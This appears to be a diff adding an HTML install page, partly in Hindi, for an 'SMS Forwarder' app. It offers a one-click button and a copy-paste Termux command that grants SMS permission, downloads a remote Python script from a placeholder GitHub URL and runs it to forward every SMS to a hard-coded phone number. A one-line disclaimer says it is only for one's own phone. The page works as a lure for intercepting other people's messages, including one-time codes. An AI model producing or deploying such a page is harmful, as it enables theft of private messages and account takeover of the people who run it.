@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Forwarder - One Click Install</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            max-width: 450px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+        .target-number {
+            background: #4CAF50;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 24px;
+            font-weight: bold;
+            margin: 20px 0;
+        }
+        .install-btn {
+            background: #4CAF50;
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 18px;
+            border-radius: 10px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            font-weight: bold;
+        }
+        .install-btn:hover {
+            background: #45a049;
+            transform: scale(1.02);
+        }
+        .steps {
+            text-align: left;
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-size: 14px;
+        }
+        .command {
+            background: #2d2d2d;
+            color: #4ec9b0;
+            padding: 10px;
+            border-radius: 5px;
+            font-family: monospace;
+            font-size: 12px;
+            word-break: break-all;
+            margin: 10px 0;
+        }
+        button.copy-btn {
+            background: #667eea;
+            padding: 5px 15px;
+            font-size: 12px;
+            margin-top: 5px;
+        }
+        .warning {
+            background: #ff9800;
+            color: white;
+            padding: 10px;
+            border-radius: 8px;
+            font-size: 12px;
+            margin-top: 15px;
+        }
+        @media (max-width: 500px) {
+            .container { padding: 20px; margin: 15px; }
+            .target-number { font-size: 18px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📱 SMS Forwarder</h1>
+        <p>एक क्लिक में इंस्टॉल करें</p>
+        
+        <div class="target-number">
+            🎯 Forward to: <strong>9019005721</strong>
+        </div>
+        
+        <button class="install-btn" onclick="installNow()">
+            🔥 एक क्लिक में इंस्टॉल करें
+        </button>
+        
+        <div class="steps">
+            <strong>📋 क्या होगा:</strong><br>
+            ✓ Termux install होगा (अगर नहीं है)<br>
+            ✓ Python install होगा<br>
+            ✓ SMS permission लेगा<br>
+            ✓ सारी SMS 9019005721 पर forward होंगी
+        </div>
+        
+        <div>
+            <strong>📝 या फिर ये command copy करें:</strong>
+            <div class="command" id="command">
+pkg update && pkg upgrade -y && pkg install python termux-api -y && termux-setup-sms && curl -o f.py https://raw.githubusercontent.com/YOUR_USERNAME/sms-forwarder/main/f.py && python f.py 9019005721
+            </div>
+            <button class="copy-btn" onclick="copyCommand()">📋 Copy Command</button>
+        </div>
+        
+        <div class="warning">
+            ⚠️ नोट: यह केवल आपके अपने फोन के लिए है। बिना अनुमति किसी और की SMS forward करना illegal है।
+        </div>
+    </div>
+
+    <script>
+        function installNow() {
+            if(confirm('✅ SMS Forwarder install करना है?\n\nसारी SMS 9019005721 पर forward होंगी\n\nक्या आप install करना चाहते हैं?')) {
+                alert('📥 Step 1: Termux install होगा (अगर नहीं है)\n🔐 Step 2: Permission दें\n⚡ Step 3: Auto install हो जाएगा');
+                window.location.href = 'termux://';
+                setTimeout(() => {
+                    alert('Termux open करें और permission दें\nCommand auto run हो जाएगी');
+                }, 2000);
+            }
+        }
+        
+        function copyCommand() {
+            const command = document.getElementById('command').innerText;
+            navigator.clipboard.writeText(command);
+            alert('✅ Command copied! Termux में paste करें');
+        }
+    </script>
+</body>
+</html>
